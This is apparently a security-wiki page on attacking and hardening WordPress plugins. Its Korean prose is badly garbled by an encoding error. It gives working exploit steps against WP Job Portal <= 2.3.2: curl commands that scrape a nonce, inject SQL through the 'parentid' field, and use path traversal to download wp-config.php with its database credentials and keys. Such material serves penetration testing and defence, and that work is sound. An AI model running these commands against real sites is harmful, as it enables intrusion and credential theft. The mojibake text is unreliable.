ì¼ë°˜ì ì¸ edge/server WAFëŠ” ê´‘ë²”ìœ„í•œ íŒ¨í„´(SQLi, XSS, LFI)ì— ë§ì¶° íŠœë‹ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë§ì€ ê³ ì˜í–¥ WordPress/plugin ê²°í•¨ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ íŠ¹ìœ ì˜ ë¡œì§/ì¸ì¦ ë²„ê·¸ë¡œ, ì—”ì§„ì´ WordPress ê²½ë¡œì™€ plugin semanticsë¥¼ ì´í•´í•˜ì§€ ëª»í•˜ë©´ ì •ìƒ íŠ¸ë˜í”½ì²˜ëŸ¼ ë³´ì…ë‹ˆë‹¤.

Offensive notes

- í´ë¦° í˜ì´ë¡œë“œë¡œ plugin ì „ìš© ì—”ë“œí¬ì¸íŠ¸ë¥¼ ê³µëµí•˜ì„¸ìš”: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- ë¨¼ì € ì¸ì¦ ì—†ëŠ” ê²½ë¡œë¥¼ ì‹œë„í•˜ì„¸ìš” (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). ê¸°ë³¸ í˜ì´ë¡œë“œëŠ” ì¢…ì¢… ë‚œë…í™” ì—†ì´ë„ ì„±ê³µí•©ë‹ˆë‹¤.
- ì „í˜•ì ì¸ ê³ ì˜í–¥ ì‚¬ë¡€: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- í”ŒëŸ¬ê·¸ì¸ CVEsë¥¼ ë³´í˜¸í•˜ê¸° ìœ„í•´ ì¼ë°˜ì ì¸ WAF ì‹œê·¸ë‹ˆì²˜ì—ë§Œ ì˜ì¡´í•˜ì§€ ë§ˆì„¸ìš”. ì• í”Œë¦¬ì¼€ì´ì…˜ ë ˆì´ì–´ ìˆ˜ì¤€ì˜ ì·¨ì•½ì ë³„ ê°€ìƒ íŒ¨ì¹˜ë‚˜ ë¹ ë¥¸ ì—…ë°ì´íŠ¸ë¥¼ ì ìš©í•˜ì„¸ìš”.
- negative regex í•„í„°ë³´ë‹¤ ì½”ë“œ ë‚´ì—ì„œ positive-security ê²€ì‚¬(ì˜ˆ: capabilities, nonces, ì—„ê²©í•œ ì…ë ¥ ê²€ì¦)ë¥¼ ìš°ì„  ì ìš©í•˜ì„¸ìš”.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ë˜í•œ, **ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” WordPress í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆë§Œ ì„¤ì¹˜í•˜ì„¸ìš”**.

### ë³´ì•ˆ í”ŒëŸ¬ê·¸ì¸

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ê¸°íƒ€ ê¶Œì¥ì‚¬í•­**

- ê¸°ë³¸ **admin** ê³„ì • ì œê±°
- **ê°•ë ¥í•œ ë¹„ë°€ë²ˆí˜¸** ë° **2FA** ì‚¬ìš©
- ì£¼ê¸°ì ìœ¼ë¡œ ì‚¬ìš©ì **ê¶Œí•œ**ì„ **ê²€í† **
- **ë¡œê·¸ì¸ ì‹œë„ ì œí•œ**ì„ ì„¤ì •í•´ Brute Force attacks ë°©ì§€
- **`wp-admin.php`** íŒŒì¼ ì´ë¦„ì„ ë³€ê²½í•˜ê³  ë‚´ë¶€ ë˜ëŠ” íŠ¹ì • IPì—ì„œë§Œ ì ‘ê·¼ í—ˆìš©í•˜ì„¸ìš”.


### ì¸ì¦ë˜ì§€ ì•Šì€ SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal ì±„ìš© í”ŒëŸ¬ê·¸ì¸ì€ **savecategory** ì‘ì—…ì„ ë…¸ì¶œí–ˆìœ¼ë©°, ì´ëŠ” ê²°êµ­ `modules/category/model.php::validateFormData()` ë‚´ë¶€ì—ì„œ ë‹¤ìŒì˜ ì·¨ì•½í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
ì´ ìŠ¤ë‹ˆí«ìœ¼ë¡œ ì¸í•´ ë°œìƒí•œ ë¬¸ì œ:

1. **ê²€ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì ì…ë ¥** â€“ `parentid`ê°€ HTTP ìš”ì²­ì—ì„œ ë°”ë¡œ ì „ë‹¬ë©ë‹ˆë‹¤.
2. **WHERE ì ˆ ë‚´ ë¬¸ìì—´ ì—°ê²°** â€“ `is_numeric()` / `esc_sql()` / prepared statement ì—†ìŒ.
3. **ì¸ì¦ ì—†ì´ ì ‘ê·¼ ê°€ëŠ¥** â€“ actionì´ `admin-post.php`ë¥¼ í†µí•´ ì‹¤í–‰ë˜ê¸´ í•˜ì§€ë§Œ, ì¡´ì¬í•˜ëŠ” ìœ ì¼í•œ ì²´í¬ëŠ” ëª¨ë“  ë°©ë¬¸ìê°€ ê³µê°œ í˜ì´ì§€ì—ì„œ ìˆì½”ë“œ `[wpjobportal_my_resumes]`ë¥¼ í†µí•´ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” **CSRF nonce**(`wp_verify_nonce()`)ë¿ì…ë‹ˆë‹¤.

#### ì•…ìš©

1. ìƒˆë¡œìš´ nonceë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`ë¥¼ ì•…ìš©í•´ ì„ì˜ì˜ SQLì„ ì£¼ì…í•©ë‹ˆë‹¤:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ì‘ë‹µì€ ì£¼ì…ëœ ì¿¼ë¦¬ì˜ ê²°ê³¼ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë³€ê²½í•˜ì—¬ SQLië¥¼ ì¦ëª…í•©ë‹ˆë‹¤.


### ì¸ì¦ ì—†ì´ ì„ì˜ íŒŒì¼ ë‹¤ìš´ë¡œë“œ / ê²½ë¡œ ìˆœíšŒ (WP Job Portal <= 2.3.2)

ë˜ ë‹¤ë¥¸ taskì¸ **downloadcustomfile**ì€ ë°©ë¬¸ìê°€ ê²½ë¡œ ìˆœíšŒë¥¼ í†µí•´ ë””ìŠ¤í¬ì˜ **ì•„ë¬´ íŒŒì¼(any file on disk)** ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆê²Œ í—ˆìš©í–ˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ sinkëŠ” `modules/customfield/model.php::downloadCustomUploadedFile()`ì— ìœ„ì¹˜í•©ë‹ˆë‹¤:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name`ì€ ê³µê²©ìê°€ ì œì–´í•˜ë©° **ê²€ì¦ ì—†ì´** ì´ì–´ë¶™ì—¬ì§‘ë‹ˆë‹¤. ë‹¤ì‹œ ë§í•´, ìœ ì¼í•œ ê´€ë¬¸ì€ ì´ë ¥ì„œ í˜ì´ì§€ì—ì„œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” **CSRF nonce**ì…ë‹ˆë‹¤.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ì„œë²„ê°€ `wp-config.php`ì˜ ë‚´ìš©ì„ ë°˜í™˜í•˜ì—¬ DB credentials ë° auth keysë¥¼ leakingí•©ë‹ˆë‹¤.

## ì°¸ê³ ìë£Œ

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
